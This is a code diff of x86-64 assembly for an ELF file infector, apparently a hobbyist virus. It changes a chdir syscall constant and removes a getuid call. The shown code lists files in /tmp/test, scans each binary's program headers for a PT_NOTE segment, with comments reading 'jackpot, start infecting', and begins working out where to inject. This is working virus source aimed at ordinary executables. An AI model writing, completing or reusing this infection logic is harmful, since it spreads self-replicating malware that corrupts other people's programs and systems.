@@ -11,7 +11,7 @@
 %define SYS_PWRITE64	18
 %define SYS_SYNC		162
 %define SYS_GETUID		102
-
+%define SYS_CHDIR		80
 %define DT_REG			8
 
 %define SEEK_END		2
@@ -70,7 +70,7 @@ _start:
 	call set_folder_chdir
 	chdir:
 		pop rdi
-		mov rax, 80
+		mov rax, SYS_CHDIR
 		syscall
 	call set_folder ;/tmp/test
 	dirent:                                            ; pushing "." to stack (rsp)
@@ -137,8 +137,7 @@ _start:
 
 			cmp byte [r15 + 208], PT_NOTE                       ; check if phdr.type in [r15 + 208] is PT_NOTE (4)
 			jz .continue                                          ; if yes, jackpot, start infecting
-			mov rax, SYS_GETUID
-			syscall
+
 			inc rbx                                             ; if not, increase rbx counter
 			cmp bx, word [r15 + 200]                            ; check if we looped through all phdrs already (ehdr.phnum = [r15 + 200])
 			jge .close_file                                     ; exit if no valid phdr for infection was found
@@ -147,6 +146,7 @@ _start:
 			jnz .loop_phdr                                      ; read next phdr
 
 		.infect:
+
 			.get_target_phdr_file_offset:
 				mov ax, bx                                      ; loading phdr loop counter bx to ax
 				mov dx, word [r15 + 198]                        ; loading ehdr.phentsize from [r15 + 198] to dx
